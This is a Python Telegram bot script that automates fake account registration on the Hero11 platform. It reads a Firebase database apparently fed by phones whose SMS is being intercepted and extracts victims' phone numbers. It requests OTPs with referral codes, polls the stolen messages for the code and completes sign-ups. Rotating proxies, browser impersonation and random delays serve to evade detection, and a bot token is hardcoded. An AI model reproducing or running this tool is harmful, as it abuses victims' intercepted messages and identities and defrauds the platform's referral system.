import os
import sys
import re
import time
import uuid
import random
import json
import gc

import requests
from curl_cffi.requests import AsyncSession
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.storage.memory import MemoryStorage

# ==============================================================================
# ⚙️ CONFIGURATION & SECURITY
# ==============================================================================
BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"  # Apna Telegram Bot Token yahan dalein
ADMIN_ID = 8337013809  # Apna Admin User ID yahan dalein
OTP_TIMEOUT = 30
POLL_INTERVAL = 2
TIMEOUT = 30

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ==============================================================================
# 🛒 HERO11 ASYNC CLIENT ENGINE
# ==============================================================================
def parse_firebase_link(link: str):
    link = link.strip()
    if not link or link.startswith("#"):
        return None
    if not link.startswith("http"):
        link = "https://" + link
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link if link.endswith("/") else link + "/"
    return None

def extract_phone(messages_dict):
    text_data = str(messages_dict)
    match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
    return match.group(1) if match else None

def load_proxies():
    proxy_file = "proxies.txt"
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                p = line.strip()
                if p and not p.startswith("#"):
                    proxies.append(p)
    return proxies

PROXIES_LIST = load_proxies()

def get_random_proxy():
    if PROXIES_LIST:
        return random.choice(PROXIES_LIST)
    return None

class AsyncHero11Client:
    BASE_URL = "https://hero11-in.hero11apex.com"
    
    def __init__(self, phone: str, invite_code: str):
        self.phone = re.sub(r'[^0-9+]', '', str(phone))
        if not self.phone.startswith('+'):
            digits = re.sub(r'[^0-9]', '', self.phone)
            if len(digits) == 10:
                self.phone = "+91" + digits
            elif len(digits) >= 10:
                self.phone = "+91" + digits[-10:]
        
        self.invite_code = invite_code
        self.device_id = uuid.uuid4().hex
        self.proxy = get_random_proxy()
        self.session = AsyncSession(proxy=self.proxy) if self.proxy else AsyncSession()
        self.access_token = None
        self.attribute_uuid = None

    async def close(self):
        try:
            await self.session.close()
        except Exception:
            pass

    async def _request(self, method, path, data=None):
        url = self.BASE_URL + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://hero11-in.hero11apex.com",
            "Referer": f"https://hero11-in.hero11apex.com/en/affiliate-invited?c={self.invite_code}&s=1",
            "X-IP-Country": "IN",
            "X-Region": "IN",
            "X-Lang": "en-US",
            "X-Site-Code": "hero11-in",
            "X-UI-Variant": "v2",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
            "Sec-Ch-Ua-Mobile": "?0",
        }
        if self.access_token:
            headers["Authorization"] = self.access_token

        try:
            response = await self.session.request(
                method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
            )
            if response.status_code >= 400:
                return None
            return response.json()
        except Exception:
            return None

    async def pre_bind(self):
        payload = {
            "inviteCode": self.invite_code,
            "device": "pc",
            "source": "1",
            "activity": "3",
            "use_type": 1,
            "materialId": 10
        }
        await asyncio.sleep(random.uniform(0.8, 1.8))
        result = await self._request("POST", "/services/user/attribution/v1/attributionLink", data=payload)
        if result and "data" in result and isinstance(result.get("data"), dict):
            self.attribute_uuid = result.get("data", {}).get("uuid") or str(uuid.uuid4())
        else:
            self.attribute_uuid = str(uuid.uuid4())
        return True

    async def black_check(self):
        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "deviceId": self.device_id,
            "loginType": 1,
            "phoneCountryCode": "+91"
        }
        await asyncio.sleep(random.uniform(0.5, 1.2))
        result = await self._request("POST", "/services/user/auth/v1/blackCheck", data=payload)
        if result and "data" in result and isinstance(result.get("data"), dict):
            if result["data"].get("isNew") == 2:
                return "SKIP_EXISTS"
        return "SUCCESS"

    async def send_otp(self):
        await self.pre_bind()
        check = await self.black_check()
        if check == "SKIP_EXISTS":
            return "SKIP_EXISTS"

        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "deviceId": self.device_id,
            "loginType": 1,
            "phoneCountryCode": "+91",
            "cfToken": ""
        }
        await asyncio.sleep(random.uniform(1.0, 2.2))
        result = await self._request("POST", "/services/user/auth/v1/sendCode", data=payload)
        
        if result and result.get("code") == 0:
            return "SUCCESS"
        elif result and result.get("code") in [100005, 102018, 102017, 40007]:
            return "SKIP_EXISTS"
        return "FAILED"

    async def verify_otp(self, otp_code):
        if not self.attribute_uuid:
            self.attribute_uuid = str(uuid.uuid4())
        
        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "code": str(otp_code).strip(),
            "deviceId": self.device_id,
            "deviceInfo": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
            "inviteCode": self.invite_code,
            "loginDeviceType": "1",
            "loginType": 1,
            "countryCode": "IN",
            "phoneCountryCode": "+91",
            "cfToken": "",
            "attributeUuid": self.attribute_uuid,
            "distinctId": self.device_id,
            "material_id": 10,
            "hash": "f4ea2d51d0827c5b8c180f4ad7b83ca2"
        }
        await asyncio.sleep(random.uniform(1.5, 3.0))
        result = await self._request("POST", "/services/user/auth/v1/loginWithCode", data=payload)
        
        if result and result.get("code") == 0:
            self.access_token = result.get("data", {}).get("accessToken")
            return "SUCCESS"
        return "INVALID"

# ==============================================================================
# 🤖 TELEGRAM BOT DISPATCHER & LIVE LOGGING
# ==============================================================================
class LiveLogger:
    def __init__(self, message: types.Message):
        self.message = message
        self.last_update = 0
        self.last_text = ""

    async def set_text(self, text, force=False):
        if text == self.last_text:
            return
        now = time.time()
        if force or (now - self.last_update > 1.0):
            try:
                await self.message.edit_text(f"<code>{text}</code>", parse_mode="HTML")
                self.last_update = time.time()
                self.last_text = text
            except Exception:
                pass

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("👋 <b>Welcome Admin!</b>\n\nSend your Firebase RTDB link followed by referral codes (one code per line).")

@dp.message(F.text)
async def process_inputs(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    lines = [line.strip() for line in message.text.split("\n") if line.strip()]
    if not lines:
        await message.answer("❌ No input provided.")
        return

    firebase_url = parse_firebase_link(lines[0])
    if not firebase_url:
        await message.answer("❌ First line must be a valid Firebase database URL.")
        return

    codes = [c.upper() for c in lines[1:] if c]
    if not codes:
        await message.answer("❌ Please provide at least one referral code below the Firebase link.")
        return

    status_msg = await message.answer("🔍 <b>Connecting and counting online devices on Firebase...</b>")
    
    online_targets = []
    total_online_count = 0
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
                clients_data = await r.json() or {}

            seen_phones = set()
            for cid, cdata in clients_data.items():
                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                    try:
                        async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
                            msgs = await m_req.json()
                            phone = extract_phone(msgs) if msgs else None
                            if phone and phone not in seen_phones:
                                seen_phones.add(phone)
                                online_targets.append({"cid": cid, "phone": "+91" + phone})
                                total_online_count += 1
                    except Exception:
                        pass
    except Exception as e:
        await status_msg.edit_text(f"❌ Failed to connect to Firebase: {e}")
        return

    needed_per_code = 2
    total_needed = len(codes) * needed_per_code

    await status_msg.edit_text(
        f"🔥 <b>Firebase Connected Successfully!</b>\n"
        f"🟢 <b>Exact Online Devices Found: {total_online_count}</b>\n"
        f"🎯 <b>Target Registrations Needed: {total_needed}</b>"
    )

    if not online_targets:
        await message.answer("❌ No active online numbers found in this Firebase database.")
        return

    success_count = 0
    skipped_phones = set()
    logger = LiveLogger(status_msg)

    for target in online_targets:
        if success_count >= total_needed:
            break

        cid = target["cid"]
        phone = target["phone"]
        if phone in skipped_phones:
            continue

        code_idx = success_count // needed_per_code
        current_code = codes[code_idx] if code_idx < len(codes) else "DONE"

        await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code}\n⏳ Requesting OTP...")

        import aiohttp
        async with aiohttp.ClientSession() as session:
            known_keys = set()
            try:
                async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
                    k_data = await r.json()
                    if isinstance(k_data, dict):
                        known_keys = set(k_data.keys())
            except Exception:
                pass

        client = AsyncHero11Client(phone, current_code)
        send_status = await client.send_otp()

        if send_status != "SUCCESS":
            skipped_phones.add(phone)
            await client.close()
            continue

        await logger.set_text(f"🎯 Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")

        otp_found = None
        start_poll = time.time()
        while time.time() - start_poll < OTP_TIMEOUT:
            await asyncio.sleep(POLL_INTERVAL)
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
                        msgs = await r.json()
                        if isinstance(msgs, dict):
                            for msg_key, msg_val in msgs.items():
                                if msg_key not in known_keys and isinstance(msg_val, dict):
                                    txt = str(msg_val.get("body") or msg_val.get("message") or "")
                                    for otp in re.findall(r'\b(\d{6})\b', txt):
                                        if otp not in ["000000", "123456", "111111", "999999"]:
                                            otp_found = otp
                                            break
                            if otp_found:
                                break
            except Exception:
                pass

        if not otp_found:
            skipped_phones.add(phone)
            await client.close()
            continue

        await logger.set_text(f"🎯 Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
        v_res = await client.verify_otp(otp_found)

        if v_res == "SUCCESS":
            success_count += 1
            skipped_phones.add(phone)
            await logger.set_text(f"✅ SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
        else:
            skipped_phones.add(phone)

        await client.close()
        await asyncio.sleep(1.5)

    final_msg = (
        f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 <b>Online Devices Detected:</b> {total_online_count}\n"
        f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await message.answer(final_msg)

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n❌ Bot stopped.")
        sys.exit(0)
